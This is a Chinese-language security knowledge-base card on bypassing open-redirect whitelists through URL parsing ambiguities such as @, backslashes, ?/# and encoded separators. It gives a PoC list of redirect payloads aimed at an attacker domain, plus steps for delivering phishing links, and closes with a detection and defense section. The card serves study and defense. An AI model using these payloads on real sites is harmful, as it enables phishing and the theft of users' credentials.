---
id: web-generic-open-redirect-url-parser-confusion-bypass
title: 开放重定向的 URL 解析歧义绕过：@、反斜杠/斜杠、问号/井号、协议省略与编码分隔符让白名单与浏览器各看各的
type: scenario
domain: web
path: web/generic/open-redirect
technique: url-parser-confusion-redirect-bypass
tags:
- open-redirect
- url-parser
- bypass
- whitelist
- phishing
- web
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V445
  verified_at: '2026-11-09T23:29:50+08:00'
  notes: 已对照原文《url重定向奇淫技巧》与图01/02(meta属性表)核对：@、反斜杠/斜杠、?/#、协议相对/省略、%00/%E3%80%82、多重斜杠等变体族与原文『绕过方法汇总』一致，PoC 为变体清单的蒸馏。未验证点：各变体接受度依后端/浏览器版本而异（原文即要求逐一实测），未本机复测；无组件版本。与既有 SSRF URL 解析差异卡非同链（本卡 sink 为浏览器/Location 跳转），与同批 whitelist-substring/nested/meta 卡两两 trigram<=0.125，无重复。
url: /docs/web/generic/open-redirect/web-generic-open-redirect-url-parser-confusion-bypass/
draft: false
kb_aliases:
- 开放重定向绕过
- URL 解析歧义
- '@ 绕过跳转'
- 反斜杠绕过白名单
- scheme-relative redirect
- 任意 URL 跳转
---

## 一句话结论

很多开放重定向的“白名单/正则”是在字符串层判断的，而浏览器按 URL 标准解析；利用 `@` 的 userinfo 分隔、反斜杠被当作斜杠、`?`/`#` 截断、协议相对 `//`、协议省略 `https:host`、百分号/Unicode 编码的“。”和斜杠等歧义，就能让校验器看到“合法域名”而浏览器最终跳到攻击者域。

## 原理

- 服务器常见校验：`url.startswith("http://login.aaa.com")`、`"aaa.com" in url`、正则匹配 host，或只允许以公司域名开头的字符串。这些判断在**原始字符串**上进行。
- 浏览器/HTTP 客户端按 RFC 3986/WHATWG 解析 URL：`@` 之前是 userinfo，真正的 host 在 `@` 之后；反斜杠在浏览器中常被归一化为 `/`；`?`/`#` 截断后面的内容；`//host` 是协议相对 URL；省略协议时 `https:host` 仍会按 HTTPS 访问 host。两者对“哪部分是主机”的理解不同，就产生绕过。
- 典型绕过族（`login.aaa.com` 为白名单域，`test.com` 为攻击者域）：
  - `@` 混淆：`http://login.aaa.com@test.com` → 访问 test.com；`http://test.com@login.aaa.com` 反过来用于钓鱼伪装。
  - 反斜杠/正斜杠：`http://test.com\login.aaa.com`、`http://test.com\\login.aaa.com`、`http://test.com\.login.aaa.com`、`http://test.com/login.aaa.com`。
  - 问号/井号：`http://test.com?login.aaa.com`、`http://test.com#login.aaa.com`。
  - 协议相对/省略：`//test.com`、`https:test.com`、`https:/test.com`、`\/\/test.com`、`/\/test.com`。
  - 编码与 Unicode：`attacker%00.com`（NUL 截断部分解析器）、`attacker%E3%80%82com`（全角句号）、`%0A`、分数斜杠 `⁄`、修饰符字母 `ʔ` 等；不同浏览器/后端对它们的归一化不一致。
  - 多重斜杠：`http://test.com///login.aaa.com`、`http://test.com;https://login.aaa.com` 等。
- 额外变体：`http`↔`https` 协议切换、省略 `http:` 前缀，常在只校验字符串前缀的实现中通过。
- 为什么有效：同一字符串在两套解析器（校验器与浏览器）中得到不同的 host；只要浏览器最终使用的 host 是攻击者域，服务端的“合法判断”就失去意义。

## 触发条件

- 站点存在把用户输入用于 `Location`/`window.location`/`<meta refresh>` 的跳转参数（登录、登出、分享、支付回跳、OAuth 回调等）；
- 校验方式是字符串前缀/包含/简单正则，未做 URL 解析后 host 精确校验；
- 浏览器会按标准解析并被重定向（Chrome 多数 `@`/斜杠变体直接跳转，Firefox 可能对 `@` 弹窗但仍可继续）。

## 利用步骤

1. 找到跳转参数（`url`、`redirect`、`redirect_to`、`return_url`、`jump`、`target`、`to`、`link`、`from`、`reurl` 等），确认其控制 `Location` 或前端跳转。
2. 先用白名单域名测试正常跳转，判断校验方式（前缀/包含/正则/黑名单）。
3. 按上述族逐个替换为“白名单域 + 分隔符 + 攻击者域”的变体，观察响应头 `Location` 与浏览器最终地址栏。
4. 命中后把攻击者域换成钓鱼页，构造可信域开头的链接投递；必要时对链接做短链/编码隐藏。

## PoC

```text
基准:   https://victim.com/redirect?url=http://login.victim.com
绕过示例（以 test.com 为攻击者域）:
  ?url=http://login.victim.com@test.com
  ?url=http://test.com\login.victim.com
  ?url=http://test.com\\login.victim.com
  ?url=http://test.com?login.victim.com
  ?url=http://test.com#login.victim.com
  ?url=//test.com
  ?url=https:test.com
  ?url=https:/test.com
  ?url=/%5C/test.com
  ?url=http://test.com%00victim.com
  ?url=http://test.com%E3%80%82victim.com
```

说明：不同后端框架/浏览器版本对上述变体的接受度不同，应逐一实测；原文给出了更长的变体清单（含 `{domain}.attacker.com`、`attacker.com/{domain}`、`attacker.com?{domain}` 等“把白名单域放到 path/query/fragment”的思路），核心都是让校验看到白名单域、浏览器访问攻击者域。

## 变体与关联

- 变体：把攻击者域放在白名单域的子域位置（`victim.com.attacker.com`），绕过只检查“包含 victim.com”的实现；或注册形似域（见白名单子串缺陷卡）。
- 变体：只允许相对路径时，用 `//attacker.com`、`/\attacker.com` 让浏览器按协议相对 URL 跳转。
- 关联：WebOb 前导空白 + 协议相对 URL 的解析差异见 [[web-generic-open-redirect-webob-whitespace-urljoin-mismatch]]；OAuth redirect_uri 场景见 [[web-generic-oauth-arbitrary-redirect-uri-code-theft]]；Host 头注入跳转见 [[web-generic-open-redirect-shiro-login-redirect-host-header]]。
- 关联：同目录二维码/分享参数场景见 [[web-generic-open-redirect-qrcode-share-url-param]]。

## 检测与防御

- 服务端不要用字符串前缀/包含判断 URL；应解析成 URL 对象后对 scheme、host、port 做精确白名单（host 必须完全等于或在受控子域列表内），拒绝 userinfo、反斜杠、多重斜杠、控制字符与非常规 Unicode。
- 只允许相对路径时，校验解析后的 host 为空且 path 以 `/` 开头、且不以 `//` 或 `/\` 开头。
- 前端跳转同样要走同一校验（`window.location`/meta refresh 均可能被注入）；输出到 `Location` 前做 URL 编码。
- 检测：WAF/日志中跳转参数出现 `@`、`%00`、`%E3%80%82`、`\\`、`//`、`?`/`#` 后跟域名等模式；对跳到外部域名的跳转做审计与告警。
